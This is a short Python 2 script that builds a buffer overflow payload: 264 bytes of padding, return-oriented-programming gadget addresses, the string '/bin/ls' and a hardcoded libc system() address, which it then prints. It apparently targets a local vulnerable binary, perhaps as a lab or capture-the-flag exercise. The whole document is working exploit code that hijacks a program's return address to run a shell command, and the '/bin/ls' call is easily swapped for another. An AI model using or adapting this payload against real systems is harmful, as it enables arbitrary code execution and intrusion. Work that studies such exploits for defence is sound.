import struct

g1 = 0x4005ee
g2 = 0x4005ed

sys_add =0x7ffff7a5b590

payload = 264*'A' + struct.pack("<Q",g1) + "/bin/ls\x00" + 'A'*8 + struct.pack("<Q",g2) + 'A'*8 + struct.pack("<Q",sys_add) + struct.pack("<Q",0x7ffff7a511e0)
print payload 